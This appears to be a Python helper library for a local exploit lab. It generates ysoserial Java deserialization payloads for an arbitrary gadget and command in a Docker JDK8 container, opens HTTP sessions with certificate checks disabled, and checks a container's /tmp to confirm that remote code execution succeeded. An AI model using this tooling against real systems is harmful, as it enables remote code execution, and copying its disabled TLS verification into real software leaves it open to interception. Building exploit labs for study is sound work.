# -*- coding: utf-8 -*-
"""multi-round-lab exp 公共库：ysoserial 生成（容器内 JDK8）、HTTP 会话、真值核查。"""
import os
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

LAB = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(LAB, "tools")
YSO = os.path.join(TOOLS, "ysoserial-all.jar")


def lab_docker_path():
    """实验根目录的 docker -v 挂载写法（D:/xxx 形式）。"""
    return LAB.replace(os.sep, "/")


def gen_yso(gadget, cmd, out_path):
    """用 eclipse-temurin:8-jre 容器生成 ysoserial 序列化载荷（宿主 JDK17 生成会失败，
    沿用旧靶场验证过的容器生成方案；stdout 直接写入二进制文件，避免管道编码损坏）。"""
    out_path = os.path.abspath(out_path)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, "wb") as f:
        r = subprocess.run(
            ["docker", "run", "--rm", "-v", lab_docker_path() + ":/w", "-w", "/w",
             "eclipse-temurin:8-jre", "java", "-jar", "/w/tools/ysoserial-all.jar",
             gadget, cmd],
            stdout=f, stderr=subprocess.PIPE)
    err = r.stderr.decode(errors="replace").strip()
    if r.returncode != 0 or os.path.getsize(out_path) == 0:
        raise RuntimeError("ysoserial 生成失败 rc=%s: %s" % (r.returncode, err))
    with open(out_path, "rb") as f:
        head = f.read(4)
    if head[:2] != b"\xac\xed":
        raise RuntimeError("产物不是合法序列化流: %r" % head)
    return out_path


def session():
    """直连本机端口的会话：不走系统代理、忽略自签名证书。"""
    s = requests.Session()
    s.trust_env = False
    s.verify = False
    return s


def wait_up(url, timeout=300, interval=5):
    """轮询直到 HTTP 可达（任何状态码都算通），返回最终状态码。"""
    s = session()
    deadline = time.time() + timeout
    last = None
    while time.time() < deadline:
        try:
            r = s.get(url, timeout=5)
            return r.status_code
        except Exception as e:  # noqa: BLE001
            last = e
            time.sleep(interval)
    raise RuntimeError("服务未就绪 %s: %s" % (url, last))


def container_truth(compose_profile, service, marker_dir="/tmp"):
    """真值核查：列出容器内 /tmp（含完整时间），用于判定 RCE 是否落地。
    返回 (rc, stdout)。"""
    r = subprocess.run(
        ["docker", "compose", "--profile", compose_profile, "exec", "-T", service,
         "ls", "-l", "--full-time", marker_dir],
        capture_output=True, text=True)
    return r.returncode, r.stdout.strip()
